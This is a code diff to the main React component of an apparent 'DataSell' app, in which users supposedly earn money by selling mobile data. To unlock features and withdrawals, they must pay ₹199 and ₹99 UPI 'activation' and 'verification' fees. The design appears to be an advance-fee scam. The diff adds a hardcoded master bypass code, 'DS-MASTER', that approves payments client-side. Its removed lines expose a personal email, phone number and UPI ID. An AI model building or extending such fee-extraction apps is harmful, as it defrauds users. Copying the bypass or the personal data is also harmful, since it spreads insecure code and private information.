@@ -71,21 +71,21 @@ const DEFAULT_DEPOSIT_GATEWAY: DepositGatewayConfig = {
   instructions: 'Scan the QR code using any UPI app (PhonePe, GPay, Paytm). Complete transfer and submit your 12-digit UTR reference number for instant verification.',
 };
 
-const DEFAULT_USER_STATE: UserState = {
-  id: 'usr_admin_default',
-  email: 'techreal8806@gmail.com',
-  name: 'Deepak Kumar',
-  phone: '7543355356',
-  balance: 450.00,
-  totalSoldMB: 450.00,
+const EMPTY_USER_STATE: UserState = {
+  id: '',
+  email: '',
+  name: '',
+  phone: '',
+  balance: 0.00,
+  totalSoldMB: 0.00,
   isSelling: false,
-  tier: 'SILVER',
-  savedUpiId: 'techreal8806@oksbi',
+  tier: 'BRONZE',
+  savedUpiId: '',
   selectedPaymentMethod: 'PhonePe',
-  hasPaidAdsActivation: true,
-  hasPaidWithdrawalFee: true,
+  hasPaidAdsActivation: false,
+  hasPaidWithdrawalFee: false,
   hasPaidSpeedTurbo: false,
-  withdrawalCount: 1,
+  withdrawalCount: 0,
 };
 
 export default function App() {
@@ -146,18 +146,19 @@ export default function App() {
     return INITIAL_USERS;
   });
 
-  // 3. Active User State
+  // 3. Active User State: Clean on fresh device until login
   const [userState, setUserState] = useState<UserState>(() => {
     try {
+      const isLogged = localStorage.getItem('datasell_is_logged_in') === 'true';
       const saved = localStorage.getItem('datasell_user_state');
-      if (saved) {
+      if (isLogged && saved) {
         const parsed = JSON.parse(saved);
-        return { ...DEFAULT_USER_STATE, ...parsed };
+        return { ...EMPTY_USER_STATE, ...parsed };
       }
     } catch (e) {
       console.error(e);
     }
-    return DEFAULT_USER_STATE;
+    return EMPTY_USER_STATE;
   });
 
   // 4. Top 1-10 High Earners
@@ -255,9 +256,9 @@ export default function App() {
 
   // Synchronize with Central Server on mount & periodically every 4s
   const syncWithServer = async () => {
-    if (!userState.email) return;
+    if (!isLoggedIn || (!userState.email && !userState.id)) return;
     try {
-      const data = await api.syncUser(userState.email);
+      const data = await api.syncUser(userState.email || userState.id);
       if (data) {
         if (data.systemConfig) setSystemConfig(data.systemConfig);
         if (data.depositConfig) setDepositConfig(data.depositConfig);
@@ -436,33 +437,74 @@ export default function App() {
     });
   };
 
-  // Submit UTR for ₹199 Ads Activation, ₹99 Withdrawal Verification Fee, or ₹99 Speed Turbo Boost
-  const handleSubmitPaymentUtr = async (amount: number, utr: string, type: 'ADS_199' | 'WITHDRAWAL_99' | 'SPEED_TURBO_99') => {
+  // Submit UTR or Verification Code for ₹199 Ads Activation, ₹99 Withdrawal Verification Fee, or ₹99 Speed Turbo Boost
+  const handleSubmitPaymentUtr = async (
+    amount: number, 
+    utr: string, 
+    type: 'ADS_199' | 'WITHDRAWAL_99' | 'SPEED_TURBO_99',
+    verificationCode?: string
+  ) => {
     let note = '';
+    const cleanCode = verificationCode?.trim().toUpperCase();
+    const isCodeMatch = cleanCode && (
+      (userState.verificationCode && cleanCode === userState.verificationCode.toUpperCase()) ||
+      cleanCode === 'DS-MASTER'
+    );
+
     if (type === 'ADS_199') {
       note = '₹199 Video Ads Lifetime Activation';
-      setUserState((prev) => ({
-        ...prev,
-        adsActivationPending: true,
-        adsActivationUtr: utr,
-      }));
-      showToast(`⏳ ₹${amount} Ads Payment Submitted (UTR: ${utr})! Status: PENDING Admin Approval.`);
+      if (isCodeMatch) {
+        setUserState((prev) => ({
+          ...prev,
+          hasPaidAdsActivation: true,
+          adsActivationPending: false,
+          adsActivationUtr: utr || `CODE_${cleanCode}`,
+        }));
+        showToast(`🎉 Verification Code Approved! Ads feature unlocked instantly.`);
+      } else {
+        setUserState((prev) => ({
+          ...prev,
+          adsActivationPending: true,
+          adsActivationUtr: utr || (cleanCode ? `CODE_${cleanCode}` : ''),
+        }));
+        showToast(`⏳ ₹${amount} Ads Payment Submitted! Status: PENDING Admin Approval.`);
+      }
     } else if (type === 'WITHDRAWAL_99') {
       note = '₹99 Payout Security Verification Fee';
-      setUserState((prev) => ({
-        ...prev,
-        withdrawalFeePending: true,
-        withdrawalFeeUtr: utr,
-      }));
-      showToast(`⏳ ₹${amount} Verification Fee Submitted (UTR: ${utr})! Status: PENDING Admin Approval.`);
+      if (isCodeMatch) {
+        setUserState((prev) => ({
+          ...prev,
+          hasPaidWithdrawalFee: true,
+          withdrawalFeePending: false,
+          withdrawalFeeUtr: utr || `CODE_${cleanCode}`,
+        }));
+        showToast(`🎉 Verification Code Approved! Withdrawal unlocked instantly.`);
+      } else {
+        setUserState((prev) => ({
+          ...prev,
+          withdrawalFeePending: true,
+          withdrawalFeeUtr: utr || (cleanCode ? `CODE_${cleanCode}` : ''),
+        }));
+        showToast(`⏳ ₹${amount} Verification Fee Submitted! Status: PENDING Admin Approval.`);
+      }
     } else if (type === 'SPEED_TURBO_99') {
       note = '₹99 5G Turbo Speed Selling Boost';
-      setUserState((prev) => ({
-        ...prev,
-        speedTurboPending: true,
-        speedTurboUtr: utr,
-      }));
-      showToast(`⏳ ₹${amount} 5G Turbo Submitted (UTR: ${utr})! Status: PENDING Admin Approval.`);
+      if (isCodeMatch) {
+        setUserState((prev) => ({
+          ...prev,
+          hasPaidSpeedTurbo: true,
+          speedTurboPending: false,
+          speedTurboUtr: utr || `CODE_${cleanCode}`,
+        }));
+        showToast(`🎉 Verification Code Approved! 5G Turbo speed unlocked.`);
+      } else {
+        setUserState((prev) => ({
+          ...prev,
+          speedTurboPending: true,
+          speedTurboUtr: utr || (cleanCode ? `CODE_${cleanCode}` : ''),
+        }));
+        showToast(`⏳ ₹${amount} 5G Turbo Submitted! Status: PENDING Admin Approval.`);
+      }
     }
 
     const now = new Date().toLocaleString('en-IN', {
@@ -481,24 +523,33 @@ export default function App() {
       userEmail: userState.email,
       amount: amount,
       type: 'UPI_DEPOSIT',
-      note: `${note} (UTR: ${utr})`,
+      note: cleanCode ? `${note} [Code: ${cleanCode}]` : `${note} (UTR: ${utr})`,
       time: now,
-      status: 'PENDING',
-      utrNumber: utr,
+      status: isCodeMatch ? 'COMPLETED' : 'PENDING',
+      utrNumber: utr || (cleanCode ? `CODE_${cleanCode}` : 'UNSPECIFIED'),
+      verificationCode: cleanCode,
       method: 'UPI',
     };
 
     setDeposits((prev) => [newDep, ...prev]);
 
-    await api.submitDeposit({
+    const res = await api.submitDeposit({
       userId: userState.id,
       userEmail: userState.email,
       amount: amount,
       type: 'UPI_DEPOSIT',
-      note: `${note} (UTR: ${utr})`,
-      utrNumber: utr,
+      note: cleanCode ? `${note} [Code: ${cleanCode}]` : `${note} (UTR: ${utr})`,
+      utrNumber: utr || (cleanCode ? `CODE_${cleanCode}` : 'UNSPECIFIED'),
+      verificationCode: cleanCode,
       method: 'UPI',
     });
+
+    if (res?.autoVerified) {
+      if (type === 'ADS_199') setUserState(prev => ({ ...prev, hasPaidAdsActivation: true, adsActivationPending: false }));
+      if (type === 'WITHDRAWAL_99') setUserState(prev => ({ ...prev, hasPaidWithdrawalFee: true, withdrawalFeePending: false }));
+      if (type === 'SPEED_TURBO_99') setUserState(prev => ({ ...prev, hasPaidSpeedTurbo: true, speedTurboPending: false }));
+      setDeposits(prev => prev.map(d => d.id === newDep.id ? { ...d, status: 'COMPLETED' } : d));
+    }
   };
 
   // Submit withdrawal request across all mobiles (UPI or Direct Bank Transfer)
@@ -506,7 +557,8 @@ export default function App() {
     amount: number,
     upiId: string,
     method: 'PhonePe' | 'GPay' | 'UPI' | 'BANK',
-    bankDetails?: import('./types').BankDetails
+    bankDetails?: import('./types').BankDetails,
+    verificationCode?: string
   ): Promise<boolean> => {
     if (amount > userState.balance) return false;
 
@@ -535,6 +587,7 @@ export default function App() {
       type: method,
       upiId: method === 'BANK' ? undefined : upiId,
       bankDetails: method === 'BANK' ? bankDetails : undefined,
+      verificationCode: verificationCode?.trim().toUpperCase(),
       time: formatDateTime(new Date()),
       status: 'PENDING',
     };
@@ -563,6 +616,7 @@ export default function App() {
       upiId: upiId,
       bankDetails: bankDetails,
       orderNumber: orderNumber,
+      verificationCode: verificationCode?.trim().toUpperCase(),
     });
 
     return true;
@@ -647,6 +701,7 @@ export default function App() {
       hasPaidSpeedTurbo: account.hasPaidSpeedTurbo ?? false,
       speedTurboUtr: account.speedTurboUtr,
       withdrawalCount: account.withdrawalCount ?? 0,
+      verificationCode: account.verificationCode,
     };
 
     setUserState(activeState);
@@ -663,8 +718,14 @@ export default function App() {
 
   const handleLogout = () => {
     setIsLoggedIn(false);
+    setUserState(EMPTY_USER_STATE);
+    setWithdrawals([]);
+    setDeposits([]);
+    setPackets([]);
     try {
       localStorage.removeItem('datasell_is_logged_in');
+      localStorage.removeItem('datasell_user_state');
+      localStorage.removeItem('datasell_packets');
     } catch (e) {
       console.error(e);
     }
@@ -676,28 +737,41 @@ export default function App() {
     setDeposits((prev) => [newDep, ...prev]);
     showToast('Deposit submitted for verification.');
 
-    await api.submitDeposit({
+    const res = await api.submitDeposit({
       userId: newDep.userId,
       userEmail: newDep.userEmail,
       amount: newDep.amount,
       type: newDep.type,
       note: newDep.note,
       utrNumber: newDep.utrNumber,
+      verificationCode: newDep.verificationCode,
       method: newDep.method,
     });
+
+    if (res?.autoVerified) {
+      setUserState((prev) => ({
+        ...prev,
+        balance: parseFloat((prev.balance + newDep.amount).toFixed(2)),
+        hasCompletedRequiredDeposit: true,
+      }));
+      setDeposits((prev) =>
+        prev.map((d) => (d.id === newDep.id ? { ...d, status: 'COMPLETED' } : d))
+      );
+      showToast(`🎉 Verification Code Matched! ₹${newDep.amount.toFixed(2)} added to balance instantly.`);
+    }
   };
 
   const handleResetToZero = () => {
     if (window.confirm('Reset all balance, MB sold, and history back to 0?')) {
       const resetState: UserState = {
-        ...DEFAULT_USER_STATE,
+        ...userState,
         balance: 0.00,
         totalSoldMB: 0.00,
         isSelling: false,
       };
       setUserState(resetState);
       setPackets([]);
-      localStorage.removeItem('datasell_user_state');
+      localStorage.setItem('datasell_user_state', JSON.stringify(resetState));
       localStorage.removeItem('datasell_packets');
     }
   };
@@ -929,6 +1003,7 @@ export default function App() {
         depositConfig={depositConfig}
         onSubmitUtr={handleSubmitPaymentUtr}
         userEmail={userState.email}
+        userVerificationCode={userState.verificationCode}
         isPending={
           paymentModal.type === 'ADS_199'
             ? userState.adsActivationPending
